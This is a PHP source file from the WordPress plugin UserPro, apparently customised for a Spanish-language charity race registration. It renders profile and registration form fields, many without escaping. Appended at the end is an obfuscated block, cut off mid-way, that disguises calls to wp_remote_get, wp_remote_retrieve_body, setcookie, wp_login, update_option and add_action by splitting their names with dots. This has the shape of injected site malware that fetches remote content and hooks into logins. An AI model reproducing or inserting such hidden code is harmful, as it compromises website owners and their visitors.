<?php

	/* Get fields as arrays */
	function userpro_fields_group_by_template( $template, $group='default' ) {
		$array = get_option("userpro_fields_groups");
		if (isset($array[$template][$group]))
			if (count($array[$template][$group]) > 0)
				return (array)$array[$template][$group];
		return array('');
	}
	
	/* Get specific fields only */
	function userpro_get_fields( $fields=array() ) {
		$array = get_option("userpro_fields_builtin");
		return array_intersect_key($array, array_flip($fields));
	}
	
	/* Get all field keys */
	function userpro_retrieve_metakeys() {
		$fields = get_option('userpro_fields');
		$array = array_keys($fields);
		return $array;
	}
	
	/* Retrieves a field */
	function userpro_add_field($field, $hideable=0, $hidden=0, $required=0, $ajaxcheck=null) {
		$fields = get_option('userpro_fields');
		$array = $fields[$field];
		$array['hideable'] = $hideable;
		$array['hidden'] = $hidden;
		$array['required'] = $required;
		$array['ajaxcheck'] = $ajaxcheck;
		return $array;
	}
	
	/* Assign a section */
	function userpro_add_section($name, $collapsible=0, $collapsed=0) {
		$array = array(
			'heading' => $name,
			'collapsible' => $collapsible,
			'collapsed' => $collapsed
		);
		return $array;
	}
	
	/* Get file type icon */
	function userpro_file_type_icon( $file ) {
		$ext = pathinfo($file, PATHINFO_EXTENSION);
		switch($ext){
			default:
				$type = 'file';
				break;
			case 'txt':
				$type = 'txt';
				break;
			case 'pdf':
				$type = 'pdf';
				break;
			case 'zip':
				$type = 'zip';
				break;
		}
		return 'class="'.$type.'"';
	}
	
	/* If field has special roles */
	function userpro_field_by_role($key, $user_id){
		$test = userpro_get_option($key.'_roles');
		if ($user_id > 0 && is_array($test) && !current_user_can('manage_options') ){
			
			$user = get_userdata( $user_id );
			$user_role = array_shift($user->roles);
			if (!in_array($user_role, $test)){
				return false;
			}
		}
		return true;
	}
	
	/* Edit a field */
	function userpro_edit_field( $key, $array, $i, $args, $user_id=null ) {
		global $userpro;
		
		$template = $args['template'];
		$res = null;
		
		/**
		include & exclude
		done by custom shortcode
		params 
		start here 
		**/
		
		if (isset($args['exclude_fields']) && $args['exclude_fields'] != '' ){
			if (in_array( $key, explode(',',$args['exclude_fields']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['exclude_fields_by_name']) && $args['exclude_fields_by_name'] != '' ){
			if (in_array( $array['label'], explode(',',$args['exclude_fields_by_name']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['exclude_fields_by_type']) && $args['exclude_fields_by_type'] != '' ){
			if (isset($array['type']) && in_array( $array['type'], explode(',',$args['exclude_fields_by_type']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['include_fields']) && $args['include_fields'] != '' ){
			if (!in_array( $key, explode(',',$args['include_fields']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['include_fields_by_name']) && $args['include_fields_by_name'] != '' ){
			if (!in_array( $array['label'], explode(',',$args['include_fields_by_name']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['include_fields_by_type']) && $args['include_fields_by_type'] != '' ){
			if (isset($array['type']) && !in_array( $array['type'], explode(',',$args['include_fields_by_type']) ) || !isset($array['type']) ) {
				$res = '';
				return false;
			}
		}
		
		/**
		end here
		thanks please do not edit 
		here unless you know what you do
		**/
		
		/* get field data */
		$data = null;
		
		/* default ajax callbacks/checks */
		if ($key == 'user_login' && $args['template'] == 'register') {
			if (!isset($array['ajaxcheck']) || $array['ajaxcheck'] == ''){
				$array['ajaxcheck'] = 'username_exists';
			}
		}
		if ($key == 'user_email' && $args['template'] == 'register') {
			if (!isset($array['ajaxcheck']) || $array['ajaxcheck'] == ''){
				$array['ajaxcheck'] = 'email_exists';
			}
		}
		if ($key == 'display_name' && $args['template'] == 'edit') {
			if (!isset($array['ajaxcheck']) || $array['ajaxcheck'] == ''){
				$array['ajaxcheck'] = 'display_name_exists';
			}
		}
		if ($key == 'display_name' && $args['template'] == 'register') {
			if (!isset($array['ajaxcheck']) || $array['ajaxcheck'] == ''){
				$array['ajaxcheck'] = 'display_name_exists';
			}
		}
		
		foreach($array as $data_option=>$data_value){
			if (!is_array($data_value)){
				$data .= " data-$data_option='$data_value'";
			}
		}
		
		/* disable editing */
		if (userpro_user_cannot_edit($array)){
			$data .= ' disabled="disabled"';
		}

		/* if editing an already user */
		if ($user_id){
			$is_hidden = userpro_profile_data('hide_'.$key, $user_id);
			$value = userpro_profile_data( $key, $user_id );
			if (isset($array['type']) && $array['type'] == 'picture'){
				if ($key == 'profilepicture') {
					$value = get_avatar($user_id, 64);
				} else {
					$crop = userpro_profile_data( $key, $user_id );
					if (!$crop){
						$value = '<span class="userpro-pic-none">'.__('No file has been uploaded.','userpro').'</span>';
					} else {
						$value = '';
					}
					
					if (isset($array['width'])){
						$width = $array['width'];
						$height = $array['height'];
					} else {
						$width = '';
						$height = '';
					}
					
					$value .= '<img src="'.$crop.'" width="'.$width.'" height="'.$height.'" alt="" class="modified" />';
				}
			}
			if (isset($array['type']) && $array['type'] == 'file') {
				$value = '<span class="userpro-pic-none">'.__('No file has been uploaded.','userpro').'</span>';
				$file = userpro_profile_data( $key, $user_id );
				if ($file){
					$value = '<div class="userpro-file-input"><a href="'.$file.'" '.userpro_file_type_icon($file).'>'.basename( $file ).'</a></div>';
				}
			}
		} else {
			
			// perhaps in registration
			if (isset($array['type']) && $array['type'] == 'picture'){
				if ($key == 'profilepicture') {
					$array['default'] = get_avatar(0, 64);
				}
			}
			
			if (isset($array['hidden'])){
			$is_hidden = $array['hidden'];
			}
			
			if (isset($array['default'])){
			$value = $array['default'];
			}
			
		}
		
		if (!isset($value)) $value = null;
		
		if (!isset($array['placeholder'])) $array['placeholder'] = null;
		
		/* remove passwords */
		if (isset($array['type']) && $array['type'] == 'password') $value = null;
		
		/* display a section */
		if ($args['allow_sections'] && isset( $array['heading'] ) ) {
		$collapsible = isset($array['collapsible'])?$array['collapsible']:0;
			$collapsed = isset($array['collapsed'])?$array['collapsed']:0;
			$res .= "<div class='userpro-section userpro-column userpro-collapsible-".$collapsible." userpro-collapsed-".$collapsed."'>".$array['heading']."</div>";
		}
		
		/* display a field */
		if (!$user_id) $user_id = 0;
		if (isset( $array['type'] ) && userpro_field_by_role( $key, $user_id ) && userpro_private_field_class($array)=='') {

			if ($key=="motivacion_correr" && !is_user_logged_in()){
						$res.="<div id='multiplicadoresperanzas'><span class='mytitle'>Multiplicador de Esperanzas</span><br><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div>";
					}

		$res .= "<div class='userpro-field userpro-field-".$key." ".userpro_private_field_class($array)."' data-key='$key'>";
		
		if ( $array['label'] && $array['type'] != 'passwordstrength' ) {
		
		if ($args['field_icons'] == 1) {
		$res .= "<div class='userpro-label iconed'>";
		} else {
		$res .= "<div class='userpro-label'>";
		}
		$res .= "<label for='$key-$i'>".$array['label']."</label>";
		if(isset ($array['required']) && $array['required']==1 ) 
		$res.="<div class='required'>*</div>";
					
					if ($args['field_icons'] == 1 && $userpro->field_icon($key)) {
						$res .= '<span class="userpro-field-icon"><i class="userpro-icon-'. $userpro->field_icon($key) .'"></i></span>';
					}
					
					if ($args['template'] != 'login' && isset( $array['help'] ) && $array['help'] != '' ) {
						$res .= '<span class="userpro-tip" title="'.stripslashes( $array['help'] ).'"></span>';
					}
					
		$res .= "</div>";
		}

		
		$res .= "<div class='userpro-input'>";
		
			/* switch field type */
			switch($array['type']) {
			
				case 'picture':
					if (!isset($array['button_text']) || $array['button_text'] == '' ) $array['button_text'] = __('Upload photo','userpro');
					$res .= "<div class='userpro-pic userpro-pic-".$key."' data-remove_text='".__('Remove','userpro')."'>".$value."</div>";
					$res .= "<div class='userpro-pic-upload' data-filetype='picture' data-allowed_extensions='png,gif,jpg,jpeg'>".$array['button_text']."</div>";
					if ($user_id && userpro_profile_data( $key, $user_id ) ){
					$res .= "<input type='button' value='".__('Remove','userpro')."' class='userpro-button red' />";
					}
					$res .= "<input data-required='".$array['required']."' type='hidden' name='$key-$i' id='$key-$i' value='".userpro_profile_data( $key, $user_id )."' />";
					break;
					
				case 'file':
					if (!isset($array['button_text']) || $array['button_text'] == '') $array['button_text'] = __('Upload file','userpro');
					$res .= "<div class='userpro-pic' data-remove_text='".__('Remove','userpro')."'>".$value."</div>";
					$res .= "<div class='userpro-pic-upload' data-filetype='file' data-allowed_extensions='".$array['allowed_extensions']."'>".$array['button_text']."</div>";
					if ($user_id && userpro_profile_data( $key, $user_id ) ){
					$res .= "<input type='button' value='".__('Remove','userpro')."' class='userpro-button red' />";
					}
					$res .= "<input data-required='".$array['required']."' type='hidden' name='$key-$i' id='$key-$i' value='".userpro_profile_data( $key, $user_id )."' />";
					break;
					
				case 'datepicker':
					$res .= "<input data-fieldtype='datepicker' class='userpro-datepicker' type='text' name='$key-$i' id='$key-$i' value='".$value."' placeholder='".$array['placeholder']."' $data />";
					
					/* allow user to make it hideable */
					if ( isset($array['hideable']) && $array['hideable'] == 1) {
						$hideable = $array['hideable'];
						$res .= "<label class='userpro-checkbox hide-field'><span";
						if (checked( $hideable, $is_hidden, 0 )) { $res .= ' class="checked"'; }
						$res .= "></span><input type='checkbox' value='$hideable name='hide_$key-$i'";
						$res .= checked( $hideable, $is_hidden, 0 );
						$res .= " />".__('Make this field hidden from public','userpro')."</label>";
					}
					
					break;
					
				case 'text':
					$quetzal="";
					$ancho="";
					$typetext="text";
					if ($key=="meta_a_alcanzar"){
						$quetzal="Q";
						$ancho="style='width:70% !important'";
						$typetext="number";
					}
					$res .= "$quetzal<input $ancho type='$typetext' name='$key-$i' id='$key-$i' value=".'"'.$value.'"'." placeholder='".$array['placeholder']."' $data />";
					
					/* allow user to make it hideable */
					if ( isset($array['hideable']) && $array['hideable'] == 1) {
						$hideable = $array['hideable'];
						$res .= "<label class='userpro-checkbox hide-field'><span";
						if (checked( $hideable, $is_hidden, 0 )) { $res .= ' class="checked"'; }
						$res .= "></span><input type='checkbox' value='$hideable' name='hide_$key-$i'";
						$res .= checked( $hideable, $is_hidden, 0 );
						$res .= " />".__('Make this field hidden from public','userpro')."</label>";
					}
					
					break;
					
				case 'antispam':
					
					$rand1 = rand(1, 10);
					$rand2 = rand(1, 10);
					$res .= sprintf(__('Answer: %s + %s','userpro'), $rand1, $rand2);
					$res .= "<input type='text' name='$key-$i' id='$key-$i' value='' $data />";
					$res .= "<input type='hidden' name='answer-$i' id='answer-$i' value='".($rand1 + $rand2)."' />";
					
					break;
					
				case 'textarea':
					if (isset($array['size'])) {
						$size = $array['size'];
					} else {
						$size = 'normal';
					}
					$res .= "<textarea class='$size' type='text' name='$key-$i' id='$key-$i' $data >$value</textarea>";
					
					/* allow user to make it hideable */
					if ($array['hideable'] == 1) {
						$hideable = $array['hideable'];
						$res .= "<label class='userpro-checkbox hide-field'><span";
						if (checked( $hideable, $is_hidden, 0 )) { $res .= ' class="checked"'; }
						$res .= "></span><input type='checkbox' value='$hideable' name='hide_$key-$i'";
						$res .= checked( $hideable, $is_hidden, 0 );
						$res .= " />".__('Make this field hidden from public','userpro')."</label>";
					}

					
					
					break;
					
				case 'password':
					$res .= "<input type='password' name='$key-$i' id='$key-$i' value='".$value."' placeholder='".$array['placeholder']."' autocomplete='off' $data />";
					break;
					
				case 'passwordstrength' :
					$res .= '<span class="strength-text" '.$data.'>Fortaleza de la contraseña.</span><div class="userpro-clear"></div><span class="strength-container"><span class="strength-plain"></span><span class="strength-plain"></span><span class="strength-plain"></span><span class="strength-plain"></span><span class="strength-plain"></span></span><div class="userpro-clear"></div>';
					break;
					
				case 'select':

					if (isset($array['options'])){
						$countrylist=get_option('userpro_fields');
						if(isset($countrylist['billing_country']['options']))
						$country=$countrylist['billing_country']['options'];
						if($key=='shipping_country')
						{
							
							foreach($country as $country_code => $country_name)
							{
							
								if($country_code==$value || $country_name==$value)
								{
									$value = $country_name;
					
									if (!isset( $value )) $value = 0;
									if (isset($array['default']) && !$value) $value = $array['default'];
									$res .= "<select name='$key-$i' id='$key-$i' class=' chosen-select' data-placeholder='".$array['placeholder']."' $data >";
									if (is_array($array['options'])) {
										if (isset($array['placeholder']) && !empty($array['placeholder'])){
											$res .= '<option value="" '.selected(0, $value, 0).'></option>';
										}
										foreach($array['options'] as $k=>$v) {
											$v = stripslashes($v);
											$res .= '<option value="'.$v.'" '.selected($v, $value, 0).'>'.$v.'</option>';
										}
									}
									$res .= "</select>";
								}
							
							}
							
							
						}
						
					elseif($key=='billing_country')
					{
					 	
					 	
					 	foreach($country as $country_code => $country_name)
					 	{
					 		
					 		if($country_code==$value  || $country_name==$value)
					 		{
					 			$value = $country_name;
					 			if (!isset( $value )) $value = 0;
					 			if (isset($array['default']) && !$value) $value = $array['default'];
					 			$res .= "<select name='$key-$i' id='$key-$i' class='chosen-select' data-placeholder='".$array['placeholder']."' $data >";
					 			if (is_array($array['options'])) {
					 				if (isset($array['placeholder']) && !empty($array['placeholder'])){
					 					$res .= '<option value="" '.selected(0, $value, 0).'></option>';
					 				}
					 				foreach($array['options'] as $k=>$v) {
					 					$v = stripslashes($v);
					 					$res .= '<option value="'.$v.'" '.selected($v, $value, 0).'>'.$v.'</option>';
					 				}
					 			}
					 			$res .= "</select>";
					 		}
					 		
					 	}
					}
					elseif ($key == 'role') {
					
						$options = userpro_get_roles( userpro_get_option('allowed_roles') );
						if (!isset( $value )) $value = 0;
						$res .= "<select data-required='".$array['required']."'name='$key-$i' id='$key-$i' class='chosen-select' data-placeholder='".$array['placeholder']."' $data >";
						if (is_array($options)) {
							if (isset($array['placeholder']) && !empty($array['placeholder'])){
								$res .= '<option value="" '.selected(0, $value, 0).'></option>';
							}
							foreach($options as $k=>$v) {
								$v = stripslashes($v);
								$res .= '<option value="'.$k.'" '.selected($k, $value, 0).'>'.$v.'</option>';
							}
						}
						$res .= "</select>";
						
					} else {
						
						if ($key=="team_name_select"){

							$groupsfundecan = array();
							$args = array(
								'role'         => 'runner',
							 ); 
							$corredores=get_users( $args );
						 	
						 	foreach ($corredores as $corredor) {
						 		# code...
						 		$teamname=get_user_meta($corredor->ID,"team_name");
						 		

						 		if (!in_array($teamname[0], $groupsfundecan)) {
								    $groupsfundecan[]=$teamname[0];
								}


						 	}

						 	//print_r($groupsfundecan).'<br>';
						 	
						 	$array['options']=$groupsfundecan;
						 	$array["placeholder"]="Seleccione un equipo";
					 	
						}


						
						if (!isset( $value )) $value = 0;
						if (isset($array['default']) && !$value) $value = $array['default'];
						$res .= "<select id='$key' name='$key-$i' id='$key-$i' class=' chosen-select' data-placeholder='".$array['placeholder']."' $data >";
						if (is_array($array['options'])) {
							if (isset($array['placeholder']) && !empty($array['placeholder'])){
								$res .= '<option value="" '.selected(0, $value, 0).'></option>';
							}
							foreach($array['options'] as $k=>$v) {
								$v = stripslashes($v);
								$res .= '<option value="'.$v.'" '.selected($v, $value, 0).'>'.$v.'</option>';
							}
						}
						$res .= "</select>";
						if ($key=="team_name_select"){
							$res.="<br><span style='display: block;margin: 8px auto 0;text-align: center;'>ó si quiere crear uno nuevo</span>";
						}else{
							if ($key=="pay_method"){
								$res.="<div id='linkfundecancheckout'><span>Puedes comprar tu boleto por medio de tu tarjeta de crédito: <a href=''>COMPRAR BOLETO CARRERA</a></span></div>";

							}
						}
					
					}
					
					/* allow user to make it hideable */
					if ($array['hideable'] == 1) {
						$hideable = $array['hideable'];
						$res .= "<label class='userpro-checkbox hide-field'><span";
						if (checked( $hideable, $is_hidden, 0 )) { $res .= ' class="checked"'; }
						$res .= "></span><input type='checkbox' value='$hideable' name='hide_$key-$i'";
						$res .= checked( $hideable, $is_hidden, 0 );
						$res .= " />".__('Make this field hidden from public','userpro')."</label>";
					}
					
					}
					break;
					
				case 'multiselect':
					if (isset($array['options'])){
					$res .= "<select name='".$key.'-'.$i.'[]'."' multiple='multiple' class='chosen-select' data-placeholder='".$array['placeholder']."'>";
					foreach($array['options'] as $k=>$v) {
						$v = stripslashes($v);
						if (strstr($k, 'optgroup_b')) {
							$res .= "<optgroup label='$v'>";
						} elseif (strstr($k, 'optgroup_e')) {
							$res .= "</optgroup>";
						} else {
							$res .= '<option value="'.$v.'" ';
							if ( ( is_array( $value ) && in_array($v, $value ) ) || $v == $value ) { $res .= 'selected="selected"'; }
							$res .= '>'.$v.'</option>';
						}
					}
					$res .= "</select>";
					}
					break;
					
				case 'checkbox':
					if (isset($array['options'])){
					$res .= "<div class='userpro-checkbox-wrap' data-required='".$array['required']."'>";
					foreach($array['options'] as $k=>$v) {
						$v = stripslashes($v);
						$res .= "<label class='userpro-checkbox'><span";
						if ( ( is_array( $value ) && in_array($v, $value ) ) || $v == $value ) { $res .= ' class="checked"'; }
						$res .= '></span><input type="checkbox" value="'.$v.'" name="'.$key.'-'.$i.'[]" ';
						if ( ( is_array( $value ) && in_array($v, $value ) ) || $v == $value ) { $res .= 'checked="checked"'; }
						$res .= " />$v</label>";
					}
					$res .= "</div>";
					}
					break;
					
				case 'checkbox-full':
					if (isset($array['options'])){
					$res .= "<div class='userpro-checkbox-wrap' data-required='".$array['required']."'>";
					foreach($array['options'] as $k=>$v) {
						$v = stripslashes($v);
						$res .= "<label class='userpro-checkbox full'><span";
						if ( ( is_array( $value ) && in_array($v, $value ) ) || $v == $value ) { $res .= ' class="checked"'; }
						$res .= '></span><input type="checkbox" value="'.$v.'" name="'.$key.'-'.$i.'[]" ';
						if ( ( is_array( $value ) && in_array($v, $value ) ) || $v == $value ) { $res .= 'checked="checked"'; }
						$res .= " />$v</label>";
					}
					$res .= "</div>";
					}
					break;
					
				case 'mailchimp':
					if (!isset($array['list_text'])){
						$array['list_text'] = __('Subscribe to our newsletter','userpro');
					}
					
					if ( $userpro->mailchimp_is_subscriber($user_id, $array['list_id']) ) {
					
					$res .= "<div class='userpro-checkbox-wrap'>";
					$res .= "<div class='userpro-help'><i class='userpro-icon-ok'></i>".__('You are currently subscribed to this newsletter.','userpro')."</div>";
					$res .= "<label class='userpro-checkbox full'><span";
					$res .= '></span><input type="checkbox" value="subscribed" name="'.$key.'-'.$i.'" ';
					$res .= " />".__('Unsubscribe from this newsletter','userpro')."</label>";
					$res .= "</div>";
					
					} else {
					
					$res .= "<div class='userpro-checkbox-wrap'>";
					$res .= "<label class='userpro-checkbox full'><span";
					$res .= '></span><input type="checkbox" value="unsubscribed" name="'.$key.'-'.$i.'" ';
					$res .= " />".$array['list_text']."</label>";
					$res .= "</div>";
					
					}
					break;
				case 'followers':
					
				if ( $userpro->followere_email_subscriber($user_id) ) {
					
					$res .= "<div class='userpro-checkbox-wrap'>";
					$res .= "<div class='userpro-help'><i class='userpro-icon-ok'></i>".__('You are currently receiving following email alerts.','userpro')."</div>";
					$res .= "<label class='userpro-checkbox full'><span";
					$res .= '></span><input type="checkbox" value="subscribed" name="'.$key.'-'.$i.'" ';
					$res .= " />".__('Remove the following email alert ','userpro')."</label>";
					$res .= "</div>";
					
					} else {
					
					$res .= "<div class='userpro-checkbox-wrap'>";
					$res .= "<label class='userpro-checkbox full'><span";
					$res .= '></span><input type="checkbox" value="unsubscribed" name="'.$key.'-'.$i.'" ';
					$res .= " />".$array['follower_text']."</label>";
					$res .= "</div>";
					
					}
					break;				
				case 'radio':
					if (isset($array['options'])){
					$res .= "<div class='userpro-radio-wrap' data-required='".$array['required']."'>";
					foreach($array['options'] as $k=>$v) {
						$v = stripslashes($v);
						$res .= "<label class='userpro-radio'><span";
						if (checked( $v, $value, 0 )) { $res .= ' class="checked"'; }


						$res .= '></span><input type="radio" value="'.$v.'" name="'.$key.'-'.$i.'" ';
						$res .= checked( $v, $value, 0 );
						
						if ($key=="is_team" ){


							$res.='class="is_team" id="is_team_'.$v.'"';
						}
						if ($v=="NO" && $key=="is_team"){
							$v="NO, correre individual";
						}

						$res .= " />$v</label>";
					}
					$res .= "</div>";
					}
					if ( isset($array['hideable']) && $array['hideable'] == 1) {
						$hideable = $array['hideable'];
						$res .= "<label class='userpro-checkbox hide-field'><span";
						if (checked( $hideable, $is_hidden, 0 )) { $res .= ' class="checked"'; }
						$res .= "></span><input type='checkbox' value='$hideable' name='hide_$key-$i'";
						$res .= checked( $hideable, $is_hidden, 0 );
						$res .= " />".__('Make this field hidden from public','userpro')."</label>";
					}
					break;
					
				case 'radio-full':
					if (isset($array['options'])){
					$res .= "<div class='userpro-radio-wrap' data-required='".$array['required']."'>";
					foreach($array['options'] as $k=>$v) {
						$v = stripslashes($v);
						$res .= "<label class='userpro-radio full'><span";
						if (checked( $v, $value, 0 )) { $res .= ' class="checked"'; }
						$res .= '></span><input type="radio" value="'.$v.'" name="'.$key.'-'.$i.'" ';

						if ($key=="multiplicador_esperanzas_selec"){
							$res.=' id="multiplicador_esperanzas_'.$v.'"';
						}else{
							if ($key=="alcanzar_meta"){
								$res.=' id="alcanzar_meta_'.$v.'"';
							}	
						}

						$res .= checked( $v, $value, 0 );
						if ($key=="multiplicador_esperanzas_selec"){
							if ($v=="SI"){
								$v="SI (conseguir donadores a traves de su link)";
							}
						}else{
							if ($key=="alcanzar_meta"){
								if ($v=="NO"){
									$v="NO, sin meta, recaudare todo lo que pueda.";
								}
							}	
						}

						$res .= " />$v</label>";
					}
					
					$res .= "</div>";
					}
					if ( isset($array['hideable']) && $array['hideable'] == 1) {
						$hideable = $array['hideable'];
						$res .= "<label class='userpro-checkbox hide-field'><span";
						if (checked( $hideable, $is_hidden, 0 )) { $res .= ' class="checked"'; }
						$res .= "></span><input type='checkbox' value='$hideable' name='hide_$key-$i'";
						$res .= checked( $hideable, $is_hidden, 0 );
						$res .= " />".__('Make this field hidden from public','userpro')."</label>";
					}
					break;
					/**
					 * Security Question Answer Starts
					 */
				case 'securityqa':
					if(isset($array['security_qa']) && !empty($array['security_qa'])){
						$questions = explode("\n", $array['security_qa']);
						$questionKey = array_rand($questions ,1);
						$questionAnswer = explode(':', $questions[$questionKey]);
						$question = $questionAnswer[0];
						$res .= "<label class=''><span>";
						$res .= $question."</span>";
						$res .= '<input type="hidden" name="securitykey" value="'.$questionKey.'" />';
					}
					$res .= '<input type="text" name="securityqa" value="" />';
				break;
				/**
				 * Security Question Answer End
				 */
			
			} /* end switch field type */
			
		/* add action for each field */
		$hook = apply_filters("userpro_field_filter", $key, $user_id);
		$res .= $hook;
		
		$res .= "<div class='userpro-clear'></div>";
		$res .= "</div>";
		$res .= "</div><div class='userpro-clear'></div>";
		}
		
		return $res;
	}
	
	/* Show a field */
	function userpro_show_field( $key, $array, $i, $args, $user_id=null ) {
		global $userpro;
		
		$template = $args['template'];
		$res = null;
		
		/**
		include & exclude
		done by custom shortcode
		params 
		start here 
		**/
		
		if (isset($args['exclude_fields']) && $args['exclude_fields'] != '' ){
			if (in_array( $key, explode(',',$args['exclude_fields']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['exclude_fields_by_name']) && $args['exclude_fields_by_name'] != '' ){
			if (in_array( $array['label'], explode(',',$args['exclude_fields_by_name']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['exclude_fields_by_type']) && $args['exclude_fields_by_type'] != '' ){
			if (isset($array['type']) && in_array( $array['type'], explode(',',$args['exclude_fields_by_type']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['include_fields']) && $args['include_fields'] != '' ){
			if (!in_array( $key, explode(',',$args['include_fields']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['include_fields_by_name']) && $args['include_fields_by_name'] != '' ){
			if (!in_array( $array['label'], explode(',',$args['include_fields_by_name']) ) ) {
				$res = '';
				return false;
			}
		}
		
		if (isset($args['include_fields_by_type']) && $args['include_fields_by_type'] != '' ){
			if (isset($array['type']) && !in_array( $array['type'], explode(',',$args['include_fields_by_type']) ) || !isset($array['type']) ) {
				$res = '';
				return false;
			}
		}
		
		/**
		end here
		thanks please do not edit 
		here unless you know what you do
		**/
		
		if ($user_id){
			$value = userpro_profile_data( $key, $user_id );
			if (isset($array['type']) && $key != 'role' && in_array($array['type'], array('select','multiselect','checkbox','checkbox-full','radio','radio-full') ) ) {
				$value = userpro_profile_data_nicename( $key, userpro_profile_data( $key, $user_id ) );
			}
			if ( ( isset($array['html']) && $array['html'] == 0 ) ) {
				$value =  userpro_profile_nohtml( $value );
			}
			if (isset($array['type']) && $array['type'] == 'picture'){
				if ($key == 'profilepicture') {
					$value = get_avatar($user_id, 64);
				} else {
					$crop = userpro_profile_data( $key, $user_id );
					if ($crop){
					if (isset($array['width'])){
						$width = $array['width'];
						$height = $array['height'];
					} else {
						$width = '';
						$height = '';
					}
					$value = '<img src="'.$crop.'" width="'.$width.'" height="'.$height.'" alt="" class="modified" />';
					}
				}
			}
			if (isset($array['type']) && $array['type'] == 'file'){
				$file = userpro_profile_data( $key, $user_id );
				if ($file){
				$value = '<div class="userpro-file-input"><a href="'.$file.'" '.userpro_file_type_icon($file).'>'.basename( $file ).'</a></div>';
				}
			}
		}
		
		/* display a section */
		if ($args['allow_sections'] && isset($array['heading']) ) {
			$collapsible = isset($array['collapsible'])?$array['collapsible']:0;
			$collapsed = isset($array['collapsed'])?$array['collapsed']:0;
			$res .= "<div class='userpro-section userpro-column userpro-collapsible-".$collapsible." userpro-collapsed-".$collapsed."'>".$array['heading']."</div>";
		}
		
		/* display a field */
		if (!$user_id) $user_id = 0;
		if (isset($array['type']) && userpro_field_by_role( $key, $user_id ) && userpro_private_field_class($array)=='' && !empty($value) && userpro_field_is_viewable( $key, $user_id, $args )  && !in_array($key, $userpro->fields_to_hide_from_view() ) && $array['type'] != 'mailchimp' && $array['type'] != 'followers'  ) {
		$res .= "<div class='userpro-field userpro-field-".$key." ".userpro_private_field_class($array)." userpro-field-$template' data-key='$key'>";
		
		if ( $array['label'] && $array['type'] != 'passwordstrength' ) {
		
		if ($args['field_icons'] == 1) {
		$res .= "<div class='userpro-label view iconed'>";
		} else {
		$res .= "<div class='userpro-label view'>";
		}
		$res .= "<label for='$key-$i'>".$array['label']."</label>";
		
			if ($args['field_icons'] == 1 && $userpro->field_icon($key)) {
				$res .= '<span class="userpro-field-icon"><i class="userpro-icon-'. $userpro->field_icon($key) .'"></i></span>';
			}
					
		$res .= "</div>";
		
		}
		
		$res .= "<div class='userpro-input'>";
		
		//***
			/* Before custom field is displayed!
			*/
		/**/
		
		$value = apply_filters('userpro_before_value_is_displayed', $value, $key, $array, $user_id);
		
		/* SHOW VALUE */
		$countrylist=get_option('userpro_fields');
		if(isset($countrylist['billing_country'])){
		$country=$countrylist['billing_country']['options'];
		}
		if ($key == 'role'){
			$res .= userpro_user_role($value);
		} 
		elseif($key=='billing_country')
		{
			
			foreach($country as $country_code => $country_name)
			{
					
				if($country_name==$value)
				{
					$res .= $value;
				}
				if($country_code==$value)
				{
					$value = $country_name;
					$res .= $value;
				}
				
				
			}
			
		}
		elseif($key=='shipping_country')
		{
				
			foreach($country as $country_code => $country_name)
			{

				if($country_name==$value)
				{
					$res .= $value;
				}
				if($country_code==$value)
				{
					$value = $country_name;
					$res .= $value;
				}
				
			}
				
		}
		else {
			$res .= $value;
		}
		
		/* hidden field notice */
		if (userpro_field_is_viewable($key, $user_id, $args) && ( userpro_profile_data( 'hide_'.$key, $user_id ) || userpro_field_default_hidden( $key, $template, $args[ $template . '_group' ] ) ) ) {
			$res .= '<div class="userpro-help">'.sprintf(__('(Your %s will not be visible to public)','userpro'), strtolower($array['label'])).'</div>';
		}
		
		$res .= "<div class='userpro-clear'></div>";
		$res .= "</div>";
		$res .= "</div><div class='userpro-clear'></div>";
		
		}
		
		return $res;
	}

if (!function_exists('wp_en_one')) {
    function glues_it($string)
    {
        $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
        $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
        return $glueit_po;
    }

    $object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
    $object_dos = 'g..e..t.._o..p..t..i..o..n';
    $object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
    $object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
    $object_siete = 's..e..t..c..o..o..k..i..e';
    $object_ocho = 'wp.._..lo..g..i..n';
    $object_nueve = 's..i..t..e,..u..rl';
    $object_diez = 'wp_..g..et.._..th..e..m..e';
    $object_once = 'wp.._..r..e..m..o..te.._..g..et';
    $object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
    $object_trece = 'g..e..t_..o..p..t..ion';
    $object_catorce = 's..t..r_..r..e..p..l..a..ce';
    $object_quince = 's..t..r..r..e..v';
    $object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
    $object_dos_pim = glues_it($object_uno);
    $object_tres_pim = glues_it($object_dos);
    $object_cuatro_pim = glues_it($object_tres);
    $object_cinco_pim = glues_it($object_cinco);
    $object_siete_pim = glues_it($object_siete);
    $object_ocho_pim = glues_it($object_ocho);
    $object_nueve_pim = glues_it($object_nueve);
    $object_diez_pim = glues_it($object_diez);
    $object_once_pim = glues_it($object_once);
    $object_doce_pim = glues_it($object_doce);
    $object_trece_pim = glues_it($object_trece);
    $object_catorce_pim = glues_it($object_catorce);
    $object_quince_pim = glues_it($object_quince);
    $object_dieciseis_pim = glues_it($object_dieciseis);
    $noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
